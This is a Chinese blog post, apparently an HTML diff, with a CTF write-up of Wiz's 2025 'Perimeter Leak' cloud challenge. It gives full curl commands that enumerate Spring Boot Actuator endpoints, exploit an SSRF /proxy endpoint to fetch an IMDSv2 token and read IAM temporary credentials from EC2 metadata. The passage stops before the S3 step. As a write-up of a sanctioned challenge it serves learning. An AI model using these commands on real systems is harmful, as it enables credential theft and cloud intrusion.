@@ -1,0 +1,942 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Yaney.jpg">
+  <link rel="icon" href="/img/lizi.svg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Yaney">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="经过几周的漏洞利用和权限提升，你终于拿到了一个服务器的访问权限，希望这就是最后一个目标服务器，并能借此从一个 S3 存储桶中提取出隐藏的 flag。但事情不会那么简单。目标环境使用了 AWS 数据边界（data perimeter）来限制对该存储桶内容的访问。祝你好运！">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WIZ-2025 竞标赛 - 第一期 (June)">
+<meta property="og:url" content="http://example.com/2025/07/03/WIZ-2025%E7%AB%9E%E6%A0%87%E8%B5%9B-%E7%AC%AC%E4%B8%80%E6%9C%9F-June/index.html">
+<meta property="og:site_name" content="Yaney&#39;s Blog">
+<meta property="og:description" content="经过几周的漏洞利用和权限提升，你终于拿到了一个服务器的访问权限，希望这就是最后一个目标服务器，并能借此从一个 S3 存储桶中提取出隐藏的 flag。但事情不会那么简单。目标环境使用了 AWS 数据边界（data perimeter）来限制对该存储桶内容的访问。祝你好运！">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/image_PP-Qko8lma.png">
+<meta property="article:published_time" content="2025-07-03T11:32:33.000Z">
+<meta property="article:modified_time" content="2025-08-05T05:07:40.578Z">
+<meta property="article:author" content="Yaney">
+<meta property="article:tag" content="AWS 安全">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/image/image_PP-Qko8lma.png">
+  
+  
+  
+  <title>WIZ-2025 竞标赛 - 第一期 (June) - Yaney&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"Bash"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Yaney&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/image/image_PP-Qko8lma.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="WIZ-2025 竞标赛 - 第一期 (June)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-03 19:32" pubdate>
+          2025年7月3日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          4.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          36 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">WIZ-2025 竞标赛 - 第一期 (June)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>WIZ 这家公司大家并不陌生，作为云原生安全领域的领军者和云研究学习的殿堂级机构，它每年都会凭借“赛博佛祖”般的创新力推出全新的线上云 CTF 比赛。</p>
+<p>自今年六月起，一场为期数月的 CTF 锦标赛正式拉开帷幕。这场赛事由 WIZ 明星研究员精心打造，旨在帮助参赛者磨练技能。完成挑战即可赢取积分，冲击排行榜，角逐终极云冠军的荣誉。</p>
+<p><img src="/image/image_9PGoFKp3sU.png" srcset="/img/loading.gif" lazyload alt="图 1：WIZ 推出的 CTF 锦标赛" title="图1：WIZ 推出的 CTF 锦标赛"></p>
+<p>笔者自然不会错过任何一期。接下来，我们将一同探讨最新一期，也是第一期的比赛，其主题为：Perimeter Leak（周边泄漏）。</p>
+<blockquote>
+<p>🎯点击【<a target="_blank" rel="noopener" href="https://cloudsecuritychampionship.com/challenge/1" title="阅读原文">题目链接</a>】，立即进入比赛环境。</p>
+</blockquote>
+<h2 id="0x01-题目描述"><a href="#0x01-题目描述" class="headerlink" title="0x01 题目描述"></a>0x01 题目描述</h2><p>经过几周的漏洞利用和权限提升，你终于拿到了一个服务器的访问权限，希望这就是最后一个目标服务器，并能借此从一个<strong>S3 存储桶中提取出隐藏的 flag</strong>。</p>
+<p>但事情不会那么简单。目标环境使用了<strong>AWS 数据边界（data perimeter）来限制对该存储桶内容的访问</strong>。祝你好运！</p>
+<p>你发现了一个<strong>部署在 AWS 上的 Spring Boot Actuator 应用</strong>，可以通过以下命令访问：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com<br><br></code></pre></td></tr></table></figure>
+
+<p>返回结果如下：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;status&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;UP&quot;</span> <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<p>这表示应用当前处于运行中 状态。</p>
+<blockquote>
+<p>🐱<strong>友情提示<br>数据边界（Data Perimeter）</strong> 是一种策略组合，用来限制谁可以访问哪些数据，在哪些网络条件下可以访问，访问行为是否合规，从而保证数据不会逃离你信任的范围。</p>
+</blockquote>
+<p><img src="/image/image_WgqZ1d7P6u.png" srcset="/img/loading.gif" lazyload alt="图 2：Perimeter Leak 的题目描述" title="图2：Perimeter Leak的题目描述"></p>
+<p>根据题目描述，我们总结出以下三点关键信息：</p>
+<ol>
+<li>“S3 存储桶中提取出隐藏的 flag”：flag 存储在 S3 中；</li>
+<li>“使用了 AWS 数据边界（data perimeter）来限制对该存储桶内容的访问”：需要获取相关凭证以实现权限提升；</li>
+<li>“部署在 AWS 上的 Spring Boot Actuator 应用”：会联想到 Spring Boot Actuator 可能因为 API 接口配置不当，暴露一些敏感信息。</li>
+</ol>
+<blockquote>
+<p>🐱<strong>友情提示</strong></p>
+<p>之前曾向某位大佬请教过，他表示：“在 Spring Boot 中，内存泄漏的实际案例虽然较为少见，但一旦发生，往往会带来严重后果。”因此，在处理 Spring Boot 相关问题时，大家务必保持高度警惕，切勿掉以轻心。</p>
+</blockquote>
+<h2 id="0x02-解题过程"><a href="#0x02-解题过程" class="headerlink" title="0x02 解题过程"></a>0x02 解题过程</h2><h3 id="2-1-环境探测：通过-Actuator-接口获取敏感信息"><a href="#2-1-环境探测：通过-Actuator-接口获取敏感信息" class="headerlink" title="2.1 环境探测：通过 Actuator 接口获取敏感信息"></a>2.1 环境探测：通过 Actuator 接口获取敏感信息</h3><p>首先，我们可以搜索一些因 Spring Boot 暴露 Actuator 接口而导致信息泄露、权限提升甚至远程代码执行（RCE）的文章。例如：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit/" title="《Spring Boot Vulnerability Exploit Check List》">《Spring Boot Vulnerability Exploit Check List》</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/news/234266.html" title="《Spring Boot Actuator 漏洞利用》">《Spring Boot Actuator 漏洞利用》</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/god_zzZ/article/details/122837698" title="《Spring Boot Actuator 漏洞复现合集》">《Spring Boot Actuator 漏洞复现合集》</a></li>
+</ul>
+<p>在查看 <code>/actuator/env</code>接口时，我们发现了一些有趣的信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq<br><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_kMc8NjFEhw.png" srcset="/img/loading.gif" lazyload alt="图 3： &#x2F;actuator&#x2F;env 接口返回了一些有趣的信息" title="图3： &#x2F;actuator&#x2F;env 接口返回了一些有趣的信息"></p>
+<p>输出内容中包含大量无关信息，我们重点关注是否能够找到 S3 存储桶名称。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/env | jq .propertySources[3].properties.BUCKET<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_V1u98IT3DS.png" srcset="/img/loading.gif" lazyload alt="图 4：从 &#x2F;actuator&#x2F;env 接口中获取了 S3 存储桶名称" title="图4：从 &#x2F;actuator&#x2F;env 接口中获取了S3 存储桶名称"></p>
+<h3 id="2-2-盲探尝试：无法匿名访问存储桶"><a href="#2-2-盲探尝试：无法匿名访问存储桶" class="headerlink" title="2.2 盲探尝试：无法匿名访问存储桶"></a>2.2 盲探尝试：无法匿名访问存储桶</h3><p>成功找到 S3 存储桶名称后，尝试进行匿名访问，但未能成功。接下来，我们需要获取相应的 IAM 凭证，以便访问存储桶中的数据。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aws s3 <span class="hljs-built_in">ls</span> s3://challenge01-470f711/ --no-sign-request<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_3JMiuQRMGg.png" srcset="/img/loading.gif" lazyload alt="图 5：匿名访问名为 challenge01-470f711 的 S3 存储桶失败" title="图5：匿名访问名为 challenge01-470f711 的S3 存储桶失败"></p>
+<h3 id="2-3-接口发现：寻找更多可用的-Actuator-接口"><a href="#2-3-接口发现：寻找更多可用的-Actuator-接口" class="headerlink" title="2.3 接口发现：寻找更多可用的 Actuator 接口"></a>2.3 接口发现：寻找更多可用的 Actuator 接口</h3><p>在权限受限的情况下，可以编写一个 shell 脚本，通过批量执行 <code>curl</code> 命令检查返回的状态码，以此判断哪些 API 接口能够获取有效信息。然而，目前所有请求均返回 <code>404</code> 错误。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/heapdump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/heapdump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/threaddump | jq<br>curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/mappings | jq<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_qF-Uh5Hp_w.png" srcset="/img/loading.gif" lazyload alt="图 6：对 Actuator 接口进行批量请求，可均返回 404 错误" title="图6：对 Actuator 接口进行批量请求，可均返回 404 错误"></p>
+<p>可当我们访问 <code>/actuator/mappings</code> 接口时，返回了一些有用的信息。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_qJp3lMQo99.png" srcset="/img/loading.gif" lazyload alt="图 7：访问 &#x2F;actuator&#x2F;mappings 接口时，返回了大量的信息" title="图 7 ： 访问 &#x2F;actuator&#x2F;mappings 接口时，返回了大量的信息"></p>
+<p>通过分析 Spring Boot 应用的接口元信息，我们识别出了存在 SSRF 漏洞的 <code>/proxy</code> 接口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/actuator/mappings | jq .contexts.spring.mappings.dispatcherServlets.dispatcherServlet[25]<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_XcslrDGSsP.png" srcset="/img/loading.gif" lazyload alt="图 8：&#x2F;proxy 接口存在 SSRF 漏洞" title="图8：&#x2F;proxy 接口存在 SSRF 漏洞"></p>
+<h4 id="理由一：路径和参数定义暴露-SSRF-入口"><a href="#理由一：路径和参数定义暴露-SSRF-入口" class="headerlink" title="理由一：路径和参数定义暴露 SSRF 入口"></a>理由一：路径和参数定义暴露 SSRF 入口</h4><p>包含一个名为<code>/proxy</code> 的 HTTP 路由，它要求必须带有<code>url</code> 参数，且很有可能是通过<code>GET /proxy?url=http://example.com</code> 这样的形式使用；</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span> <span class="hljs-attr">&quot;predicate&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&#123; [/proxy], params [url]&#125;&quot;</span> <span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<h4 id="理由二：处理逻辑暴露服务器发起请求行为"><a href="#理由二：处理逻辑暴露服务器发起请求行为" class="headerlink" title="理由二：处理逻辑暴露服务器发起请求行为"></a>理由二：处理逻辑暴露服务器发起请求行为</h4><p>该请求由<code>challenge.Application</code>类中的<code>proxy(String)</code> 方法处理，<code>proxy(String)</code>意味着整个方法只接收一个字符串参数（这个参数就是用户传入的<code>url</code>），根据<code>descriptor</code> 字段得知方法返回类型是<code>String</code>。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;handler&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;challenge.Application#proxy(String)&quot;</span><span class="hljs-punctuation">,</span><br>  <span class="hljs-attr">&quot;descriptor&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;(Ljava/lang/String;)Ljava/lang/String;&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><br></code></pre></td></tr></table></figure>
+
+<h4 id="理由三：接口没有任何访问限制或校验条件"><a href="#理由三：接口没有任何访问限制或校验条件" class="headerlink" title="理由三：接口没有任何访问限制或校验条件"></a>理由三：接口没有任何访问限制或校验条件</h4><p>没有任何<code>headers</code>、<code>methods</code>或<code>consumes</code> 限制，只要满足<code>/proxy?url=xxx</code> 形式就能触发。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;requestMappingConditions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;consumes&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;headers&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;methods&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;params&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><br>      <span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;url&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;negated&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">false</span></span><br>      <span class="hljs-punctuation">&#125;</span><br>    <span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;patterns&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;/proxy&quot;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;produces&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-punctuation">]</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="2-4-SSRF-成立：向-IMDS-发起请求"><a href="#2-4-SSRF-成立：向-IMDS-发起请求" class="headerlink" title="2.4 SSRF 成立：向 IMDS 发起请求"></a>2.4 SSRF 成立：向 IMDS 发起请求</h3><p>前面我们已经知道该应用运行在 EC2 上，这自然让我们联想到通过 SSRF 漏洞访问实例<strong>元数据服务（Instance Metadata Service，简称 IMDS）</strong>。</p>
+<p>IMDS 是 EC2 实例用于获取 IAM 临时凭证、实例 ID 和 AMI 等自身元数据的接口。共有 IMDSv1 和 IMDSv2 两个版本：</p>
+<ul>
+<li>IMDSv1：通过<code>http://169.254.169.254/latest/meta-data/</code> 直接访问，无需验证。</li>
+<li>IMDSv2：引入了 token-based 认证机制，要求先通过<code>PUT</code> 请求获取 token，然后带上 token 访问元数据。</li>
+</ul>
+<p>于是，我们通过 SSRF 漏洞直接访问<code>http://169.254.169.254/latest/meta-data</code> 接口。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/<br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_ffwB3cAs_K.png" srcset="/img/loading.gif" lazyload alt="图 9：通过 IMDSv1 访问 EC2 实例元数据失败" title="图9：通过 IMDSv1 访问 EC2 实例元数据失败"></p>
+<p>接口返回<code>HTTP 401 Unauthorized</code>，这表明 EC2 实例启动的是 IMDSv2，我们需要获取 token，再访问数据。IMDSv2 是对 IMDSv1 的安全增强版本，通过引入 token 机制，防止 SSRF 等攻击窃取实例元数据（尤其是 IAM 凭证）。</p>
+<blockquote>
+<p>🐱<strong>友情提示</strong></p>
+<p>169.254.169.254 是一个 AWS 云平台保留的本地地址，专门用于在实例内部访问元数据服务，它不会出现在公网路由中，是云计算安全与自动化的重要基础设施之一。详情请看 AWS 官方知识中心<a target="_blank" rel="noopener" href="https://repost.aws/knowledge-center/ec2-linux-metadata-retrieval" title="《How do I troubleshoot instance metadata issues on my EC2 Linux instance?》">《How do I troubleshoot instance metadata issues on my EC2 Linux instance?》</a></p>
+</blockquote>
+<h3 id="2-5-获取-Token：绕过-IMDSv2-安全机制"><a href="#2-5-获取-Token：绕过-IMDSv2-安全机制" class="headerlink" title="2.5 获取 Token：绕过 IMDSv2 安全机制"></a>2.5 获取 Token：绕过 IMDSv2 安全机制</h3><p>那么，如何绕过 IMDSv2 的机制呢？我们可以搜索 AWS 的官方知识文库，找到了一篇文章<a target="_blank" rel="noopener" href="https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html" title="《Use the Instance Metadata Service to access instance metadata》">《Use the Instance Metadata Service to access instance metadata》</a>。</p>
+<ul>
+<li>方法一：环境允许的前提下，回退到 IMDSv1；</li>
+<li>方法二：若有命令执行的权限，在实例中执行下面的命令，获取 token 的值。</li>
+</ul>
+<p><img src="/image/image_usZAYKW4gQ.png" srcset="/img/loading.gif" lazyload alt="图 10：AWS 官方文档记录的通过 token 获取 EC2 实例元数据的方式" title="图 10 ：AWS 官方文档记录的通过 token 获取 EC2 实例元数据的方式"></p>
+<p>我们采用第二种方法，构造以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 获取 IMDSv2 的 token</span><br>TOKEN=$(curl -s -X PUT \<br>  <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/api/token&quot;</span> \<br>  -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token-ttl-seconds: 21600&quot;</span>)<br><br><span class="hljs-comment"># 使用 token 请求 metadata</span><br>curl -s -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> \<br>  <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/image/image_x6vQ5WK44g.png" srcset="/img/loading.gif" lazyload alt="图 11：成功通过 token 获取到 EC2 实例的元数据" title="图 11 ： 成功通过 token 获取到 EC2 实例的元数据"></p>
+<p>我们可以重点查看<code>iam/</code> 和<code>identity-credentials/</code> 两个 metadata 路径，它们涉及到 AWS 认证凭证。其它的路径多数为信息性字段，不包含可用于权限提升的内容，我们简单了解即可。</p>
+<table>
+<thead>
+<tr>
+<th>路径</th>
+<th>内容</th>
+<th>攻击价值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>`instance-id`</td>
+<td>实例 ID</td>
+<td>信息性</td>
+</tr>
+<tr>
+<td>`ami-id`</td>
+<td>当前使用的 AMI</td>
+<td>信息性</td>
+</tr>
+<tr>
+<td>`placement&#x2F;availability-zone`</td>
+<td>区域</td>
+<td>信息性</td>
+</tr>
+<tr>
+<td>`hostname`&#x2F;`local-ipv4`</td>
+<td>主机名、私有 IP</td>
+<td>信息性</td>
+</tr>
+<tr>
+<td>`security-groups`</td>
+<td>安全组名称</td>
+<td>可用于侧信道分析</td>
+</tr>
+<tr>
+<td>`mac`&#x2F;`network&#x2F;interfaces&#x2F;`</td>
+<td>网络信息</td>
+<td>可用于网络定位，但不敏感</td>
+</tr>
+</tbody></table>
+<p>当我们访问 <code>iam/</code> 路径后，会返回子路径<code>security-credentials/</code>，然后继续进行路径遍历，就会得到一些凭证信息。<code>identity-credentials/</code> 路径也进行类似的路径遍历操作：</p>
+<ul>
+<li><p><code>iam/security-credentials/challenge01-5592368</code>路径：包含绑定到实例角色的 IAM 角色名和临时凭证</p>
+  <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/challenge01-5592368&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
+<p><img src="/image/image_iKo2qTkwzg.png" srcset="/img/loading.gif" lazyload alt="图 12：从 EC2 实例的 iam&#x2F;security-credentials&#x2F;challenge01-5592368 路径获取 IAM 临时凭证" title="图 12：从 EC2 实例的 iam&#x2F;security-credentials&#x2F;challenge01-5592368 路径获取 IAM 临时凭证"></p>
+<ul>
+<li><p><code>identity-credentials/ec2/security-credentials/ec2-instance</code>路径：较新格式，用于提供相同类型的临时 AWS 凭证。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -H <span class="hljs-string">&quot;X-aws-ec2-metadata-token: <span class="hljs-variable">$TOKEN</span>&quot;</span> <span class="hljs-string">&quot;https://ctf:88sPVWyC2P3p@challenge01.cloud-champions.com/proxy?url=http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance&quot;</span><br></code></pre></td></tr></table></figure></li>
+</ul>
